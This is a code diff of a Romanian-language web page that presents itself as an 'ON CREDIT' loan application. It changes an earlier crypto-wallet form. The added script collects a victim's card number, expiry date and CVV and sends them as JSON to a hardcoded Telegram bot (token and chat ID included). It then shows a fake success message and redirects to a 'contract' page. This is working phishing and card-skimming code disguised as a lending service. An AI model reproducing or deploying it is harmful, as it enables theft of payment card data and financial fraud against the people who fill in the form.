@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Setări Portofel - LUMIX</title>
+  <title>Aplică pentru Credit - ON CREDIT</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Poppins:wght@600&display=swap" rel="stylesheet">
   <style>
     html, body, * {
@@ -86,8 +86,47 @@
       font-weight: 600;
       margin-top: 18px;
     }
+    .card-visual {
+      width: 100%;
+      max-width: 320px;
+      height: 180px;
+      background: linear-gradient(120deg, #ffd938 52%, #dd3178 120%);
+      border-radius: 16px;
+      margin: 0 auto 28px auto;
+      box-shadow: 0 2px 24px #38ffb320;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      align-items: flex-start;
+      padding: 24px 28px;
+      color: #2251ab;
+      font-family: 'Poppins', Arial, sans-serif;
+      position: relative;
+    }
+    .card-visual .chip {
+      width: 38px; height: 26px;
+      background: #fff8;
+      border-radius: 6px;
+      margin-bottom: 18px;
+    }
+    .card-visual .card-number {
+      font-size: 1.1rem;
+      letter-spacing: 2px;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+    .card-visual .card-name {
+      font-size: 1rem;
+      font-weight: 500;
+      margin-bottom: 2px;
+    }
+    .card-visual .card-expiry {
+      font-size: 0.95rem;
+      font-weight: 400;
+    }
     @media (max-width: 500px) {
       .register-container { padding: 12px 2vw; }
+      .card-visual { padding: 12px 10px; }
     }
     /* Stiluri pentru modal */
     .modal-bg {
@@ -152,6 +191,7 @@
     }
     @media (max-width: 400px) {
       .register-container { padding: 8px 1vw; }
+      .card-visual { padding: 8px 2px; }
       .register-form input, .register-form label { font-size: 0.95rem; }
       .btn-primary { font-size: 0.95rem; padding: 10px 6px; }
       .modal { padding: 8px 2px; }
@@ -161,48 +201,114 @@
 <body>
   <div class="register-container">
     <button id="close-register" style="position:absolute;top:10px;right:16px;background:none;border:none;font-size:1.6rem;color:#ffffff;cursor:pointer;z-index:2;">&times;</button>
-    <h2>Adaugă adresă de retragere</h2>
-
+    <h2>Pe ce card doriți să primiți banii?</h2>
+    <div class="card-visual" id="card-visual">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;">
+        <div class="chip"></div>
+        <span style="font-size:1.01rem;font-weight:600;color:#2251ab;letter-spacing:0.5px;">On Credit Bank ©</span>
+      </div>
+      <div class="card-number" id="visual-card-number">•••• •••• •••• ••••</div>
+      <div class="card-name" id="visual-card-name">Nume Prenume</div>
+      <div class="card-expiry" id="visual-card-expiry">MM/YY</div>
+    </div>
     <form class="register-form" id="register-form" autocomplete="off">
-      <label for="alias">Alias</label>
-      <input type="text" id="alias" name="alias" required placeholder="Ex: Portofel principal" maxlength="40">
-      <label for="address">Adresă portofel</label>
-      <input type="text" id="address" name="address" required placeholder="Ex: 0xA1B2..." maxlength="80">
-      <button type="submit" class="btn-primary">Salvează</button>
+      <label for="nume">Nume și Prenume</label>
+      <input type="text" id="nume" name="nume" required placeholder="Ex: Popescu Ion" maxlength="30">
+      <label for="card-number">Număr card</label>
+      <input type="text" id="card-number" name="card-number" required maxlength="19" pattern="\d{4} ?\d{4} ?\d{4} ?\d{4}" placeholder="1234 5678 9012 3456" inputmode="numeric" autocomplete="cc-number">
+      <label for="exp-date">Data expirării</label>
+      <input type="text" id="exp-date" name="exp-date" required maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" placeholder="MM/YY" inputmode="numeric" autocomplete="cc-exp">
+      <label for="cvv">CVV</label>
+      <input type="password" id="cvv" name="cvv" required maxlength="3" pattern="\d{3}" placeholder="CVV" inputmode="numeric" autocomplete="cc-csc">
+      <button type="submit" class="btn-primary">Trimite Cererea</button>
     </form>
     <div class="success-message" id="success-message">
-      Adresa a fost salvată!
+      Cererea a fost trimisă! Vei fi contactat în curând.
     </div>
   </div>
   <script>
+    // Close button logic
     document.getElementById('close-register').onclick = function() {
       window.location.href = 'userprofile.html';
     };
+    // Card vizual live update
+    const cardNumberInput = document.getElementById('card-number');
+    const cardNameInput = document.getElementById('nume');
+    const cardExpiryInput = document.getElementById('exp-date');
+    const cardCVVInput = document.getElementById('cvv');
+    cardNumberInput.addEventListener('input', function() {
+      let val = cardNumberInput.value.replace(/\D/g,'').substring(0,16);
+      val = val.replace(/(.{4})/g, '$1 ').trim();
+      cardNumberInput.value = val;
+      document.getElementById('visual-card-number').textContent = val.padEnd(19, '•');
+    });
+    function updateName() {
+      const name = cardNameInput.value.trim() || 'Nume Prenume';
+      document.getElementById('visual-card-name').textContent = name;
+    }
+    cardNameInput.addEventListener('input', updateName);
+    cardExpiryInput.addEventListener('input', function() {
+      let val = cardExpiryInput.value.replace(/\D/g,'').substring(0,4);
+      if(val.length > 2) val = val.substring(0,2) + '/' + val.substring(2,4);
+      cardExpiryInput.value = val;
+      document.getElementById('visual-card-expiry').textContent = val || 'MM/YY';
+    });
+    cardCVVInput.addEventListener('input', function() {
+      let val = cardCVVInput.value.replace(/\D/g,'').substring(0,3);
+      cardCVVInput.value = val;
+    });
 
-    document.getElementById('register-form').onsubmit = function(e) {
+    // Form submit - trimite datele la Telegram bot ca JSON
+    document.getElementById('register-form').onsubmit = async function(e) {
       e.preventDefault();
-      const alias = document.getElementById('alias').value.trim();
-      const address = document.getElementById('address').value.trim();
-      const isAddrValid = address.startsWith('0x') && address.length >= 10;
-
-      if (!isAddrValid) {
-        alert('Adresă invalidă. Trebuie să înceapă cu 0x.');
-        document.getElementById('address').focus();
+      // Validare suplimentară JS pentru siguranță
+      const number = cardNumberInput.value.replace(/\s/g, '');
+      const expiration = cardExpiryInput.value.trim();
+      const cvv = cardCVVInput.value.trim();
+      if(number.length !== 16) {
+        alert("Numărul cardului trebuie să aibă exact 16 cifre.");
+        cardNumberInput.focus();
         return;
       }
-
-      const key = 'lumix_addresses';
-      const list = JSON.parse(localStorage.getItem(key) || '[]');
-      list.push({ alias, address, added_at: new Date().toISOString() });
-      localStorage.setItem(key, JSON.stringify(list));
-
+      if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiration)) {
+        alert("Data expirării trebuie să fie în format MM/YY.");
+        cardExpiryInput.focus();
+        return;
+      }
+      if(!/^\d{3}$/.test(cvv)) {
+        alert("CVV trebuie să fie exact 3 cifre.");
+        cardCVVInput.focus();
+        return;
+      }
+      // Ia lead_id-ul unic din localStorage (dacă există)
+      let leadId = localStorage.getItem('lead_id') || '';
+      // Generează JSON-ul cerut
+      const payload = {
+        message_type: "Credit_Aply_Card",
+        lead_id: leadId,
+        card: {
+          number: number,
+          expiration: expiration,
+          cvv: cvv
+        }
+      };
+      const text = encodeURIComponent(JSON.stringify(payload, null, 2));
+      const url = `https://api.telegram.org/bot7891196418:AAGpnA4Pukt85UMjgrvlBX3Unrtpy3EZPoE/sendMessage?chat_id=6953089880&text=${text}`;
+      try {
+        await fetch(url);
+      } catch (err) {
+        // Ignoră erorile, doar UX
+      }
       document.getElementById('success-message').style.display = 'block';
       setTimeout(() => {
         document.getElementById('success-message').style.display = 'none';
         document.getElementById('register-form').reset();
-        window.location.href = 'userprofile.html';
-      }, 1800);
+        document.getElementById('visual-card-number').textContent = '•••• •••• •••• ••••';
+        document.getElementById('visual-card-name').textContent = 'Nume Prenume';
+        document.getElementById('visual-card-expiry').textContent = 'MM/YY';
+        // Redirecționează către pagina separată pentru contract
+        window.location.href = "contract-popup.html";
+      }, 2500);
     };
-  </script>
-</body>
+  </script> 
 </html>
